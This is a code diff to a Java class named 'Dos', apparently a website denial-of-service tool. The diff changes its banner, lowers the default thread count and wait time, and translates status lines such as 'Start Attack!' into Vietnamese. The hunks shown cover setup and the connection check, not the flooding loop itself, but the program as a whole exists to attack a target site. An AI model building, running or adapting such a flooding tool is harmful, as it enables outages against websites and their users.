@@ -66,13 +66,13 @@ public class Dos implements Runnable {
             dos.sslCheckConnection(url);
         }
 
-        System.out.println("► Setting DDoS By: Le Minh Tu");
+        System.out.println("► Setting DoS By : Le Minh Tu");
 
         System.out.print("► Số Luồng : ");
         String amount = in.nextLine();
 
         if (amount == null || amount.equals(null) || amount.equals("")) {
-            Dos.amount = 9999999;
+            Dos.amount = 10000;
         } else {
             Dos.amount = Integer.parseInt(amount);
         }
@@ -94,7 +94,7 @@ public class Dos implements Runnable {
             }
         }
 
-        Thread.sleep(999999);
+        Thread.sleep(10000);
 
 
         System.out.println("► Bắt Đầu Tấn Công!");
@@ -117,7 +117,7 @@ public class Dos implements Runnable {
     }
 
     private void checkConnection(String url) throws Exception {
-        System.out.println("► Checking Connection");
+        System.out.println("► Kiểm tra kết nối với Website");
         URL obj = new URL(url);
         HttpURLConnection con = (HttpURLConnection) obj.openConnection();
         con.setRequestMethod("GET");
@@ -125,7 +125,7 @@ public class Dos implements Runnable {
 
         int responseCode = con.getResponseCode();
         if (responseCode == 200) {
-            System.out.println("► Connected to website");
+            System.out.println("► Đã kết nối với Website");
         }
         Dos.url = url;
     }
